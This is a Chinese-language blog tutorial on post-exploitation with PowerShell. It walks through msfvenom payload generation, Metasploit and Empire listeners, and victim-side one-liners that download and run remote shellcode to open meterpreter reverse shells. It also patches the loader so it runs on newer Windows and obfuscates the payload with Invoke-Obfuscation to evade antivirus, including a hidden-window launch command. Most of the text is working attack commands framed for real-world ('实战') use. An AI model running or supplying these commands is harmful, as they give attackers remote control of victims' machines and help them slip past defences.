原创：3sNwGeek合天智汇

PowerShell是运行在Windows操作系统上实现对系统以及应用程序进行管理自动化的命令行脚本环境，PowerShell需要.NET环境的支持，使命令行用户可以调用系统环境很多强大的功能，在渗透测试中后渗透阶段会用到payload进行反弹shell，powershell是一个不错的选择。

本次测试使用了windows子系统 kali rolling

![v2-885a78140dbc75a8ba5eee9a5f72f93c_hd.p](https://pic4.zhimg.com/80/v2-885a78140dbc75a8ba5eee9a5f72f93c_hd.png)

Windows中的kali子系统最初是纯净版，无冗余服务和工具，自己需要什么就搭建什么，比较轻便，可以减少vmware的端口转发和nat服务等网络疑难杂症，在windows应用商店下载就好了，非常方便。

服务搭建Metasploit过程apt update; apt install metasploit-framework一条命令即可。

![v2-00a7e5d1ac7c32df8478aa950fd82144_b.jp](https://pic1.zhimg.com/v2-00a7e5d1ac7c32df8478aa950fd82144_b.jpg)

![v2-e6076ba517b46a02a29fc1ac8ee0eeff_b.jp](https://pic4.zhimg.com/v2-e6076ba517b46a02a29fc1ac8ee0eeff_b.jpg)

搭建好Metasploit后默认会有msfvenom，可以使用msfvenom生成powershell payload。

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xx.xxx.xxx
LPORT=10086 -f psh-reflection --arch x64 --platform windows -f psh-reflection
-o test.ps1

![v2-a3286dc8d5b81f03ac782a78821609f0_b.jp](https://pic1.zhimg.com/v2-a3286dc8d5b81f03ac782a78821609f0_b.jpg)

生成test.ps1文件，将ps1文件保存到公网服务器中。（实战中通常可以使用加入ctf中常见的隐写手法）

在被攻击机执行命令：

![v2-239d2d2a4d3495a779ac9c9739936d25_hd.p](https://pic3.zhimg.com/80/v2-239d2d2a4d3495a779ac9c9739936d25_hd.png)

开启msf进行接收shell

use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

set LPORT 10086

exploit

结果测试在08server时可行，在高版本一点的windows中发现反弹一下就断开了。建议通常实战中都是搭好跟目标一样的环境，开始尝试杀软能不能过，payload是否能正常运行。

![v2-8dd03537ed9c987b551565afe2f5140e_b.jp](https://pic3.zhimg.com/v2-8dd03537ed9c987b551565afe2f5140e_b.jpg)

根据报错信息调试一番无果后尝试使用Empire了。

<https://github.com/empireProject/Empire>

安装完成后：

(Empire) > listeners

[!] No listeners currently active

(Empire: listeners) > uselistener meterpreter

(Empire: listeners/meterpreter) > set Host 192.168.1.3

(Empire: listeners/meterpreter) > execute

[*] Starting listener 'meterpreter'

[+] Listener successfully started!

(Empire: listeners/meterpreter) > launcher powershell

![v2-2859fc54dff0e87193940f7d8326423d_b.jp](https://pic2.zhimg.com/v2-2859fc54dff0e87193940f7d8326423d_b.jpg)

Powershell只是生成了一个Invoker-shellcode函数,调用它使用如下命令：

Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost IP地址 -Lport
端口 -Force

所以可以在靶机执行命令行执行：

C:\Users\Administrator>powershell -exec bypass -c "IEX (New-Object
Net.WebClient).DownloadString('http://x’x’x’x’x/msfps1.txt');Invoke-Shellcode
-Payload windows/meterpreter/reverse_http -Lhost 192.168.1.3 -Lport 10088
-Force

![v2-cf9fa76dc7334bed48ca0bd2568f4fa6_b.jp](https://pic3.zhimg.com/v2-cf9fa76dc7334bed48ca0bd2568f4fa6_b.jpg)

但是在windows 1904版本以上会有报错，但将99行处的

$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')

修改为

$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',
[reflection.bindingflags] "Public,Static", $null,
[System.Reflection.CallingConventions]::Any, @((New-Object
System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)

修改后可以正常反弹shell。

![v2-57b85c770404e68da8cefcfd58c933d2_b.jp](https://pic3.zhimg.com/v2-57b85c770404e68da8cefcfd58c933d2_b.jpg)

chcp 65001可以更正msf编码显示问题

![v2-fc57e9e6769bffb8a113b2b512389aef_b.jp](https://pic4.zhimg.com/v2-fc57e9e6769bffb8a113b2b512389aef_b.jpg)

既然能成功运行，就可以考虑混淆免杀的问题

powershell混淆可以使用 [Invoke-Obfuscation](https://www.cnblogs.com/sstfy/p/10440301.html)：

<https://github.com/danielbohannon/Invoke-Obfuscation>

Import-Module ./Invoke-Obfuscation.psd1;Invoke-Obfuscation

![v2-fec698addc2208d9286aac5b44f6515e_b.jp](https://pic3.zhimg.com/v2-fec698addc2208d9286aac5b44f6515e_b.jpg)

![v2-3a0a9f36ca27b210940999b1de9d8fa1_b.jp](https://pic2.zhimg.com/v2-3a0a9f36ca27b210940999b1de9d8fa1_b.jpg)

选择要混淆脚本的路径

set scriptpath C:\Users\Administrator\Desktop\msfps1.ps1

![v2-40036da622ad2b3855e286f7abd03f11_b.jp](https://pic2.zhimg.com/v2-40036da622ad2b3855e286f7abd03f11_b.jpg)

选择1，ascii编码

混淆完是这样的效果

![v2-0e16c624fbfd2cab8c4ef2dc33bbf3df_b.jp](https://pic4.zhimg.com/v2-0e16c624fbfd2cab8c4ef2dc33bbf3df_b.jpg)

powershell -windowstyle hidden -exec bypass -c "IEX (New-Object
Net.WebClient).DownloadString('http://xxx.xx.xx.xx/enc.txt');Invoke-Shellcode
-Payload windows/meterpreter/reverse_http -Lhost 192.168.1.123 -Lport 10088
-Force

![v2-38474ced999b55fa5cf7909e791bf3a0_b.jp](https://pic1.zhimg.com/v2-38474ced999b55fa5cf7909e791bf3a0_b.jpg)

![v2-71deb851626eb08e0138d086b8845438_b.jp](https://pic1.zhimg.com/v2-71deb851626eb08e0138d086b8845438_b.jpg)

![v2-a201dd3148998f6b1c5adfd6c3e0287b_b.jp](https://pic4.zhimg.com/v2-a201dd3148998f6b1c5adfd6c3e0287b_b.jpg)

总结：

powershell兼容windows
平台上其它调用，如可执行文件(exe)，批处理bat和vbs等。只要学会分析脚本，懂得分析别人写的，然后自己写一个类似的也不是太难问题。本文只是用来生成meterpreter的payload，大家初步熟悉empire框架后可以深入学习其中真正强大的后渗透功能模块。

昨天那篇powershell也建议通过，实验：PowerShell技术教程：[课程:PowerShell技术教程(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=Cee9320adea6e062017121516012500001?channelID=zhihu)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

